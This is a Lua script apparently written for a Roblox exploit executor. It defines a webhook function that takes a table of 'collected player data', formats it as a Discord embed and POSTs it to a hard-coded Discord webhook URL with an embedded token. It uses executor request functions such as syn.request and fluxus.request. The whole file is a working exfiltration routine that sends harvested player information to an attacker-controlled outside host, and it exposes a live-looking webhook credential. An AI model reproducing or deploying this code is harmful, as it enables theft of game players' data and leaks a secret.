local HttpService = game:GetService("HttpService")

function webhook(dados)
    local fields = {}
    for k, v in pairs(dados) do
        table.insert(fields, {
            name = k,
            value = tostring(v),
            inline = false
        })
    end

    local payload = {
        content = "📡 Dados do player coletados!",
        embeds = {{
            title = "🧾 Informações do Jogador",
            color = 3447003,
            fields = fields,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local url = "https://discord.com/api/webhooks/1381790979371307008/UdUqsNUNEPgx8nLdyCtaQEdxKCBkZTPQObFGuYKxzbj7CJ7YqyP5MwBtSOb6Oh008-mh"
    local json = HttpService:JSONEncode(payload)

    local req = (http_request or request or syn and syn.request or fluxus and fluxus.request)
    if req then
        req({
            Url = url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = json
        })
    else
        warn("❌ Exploit não suporta envio de webhook.")
    end
end
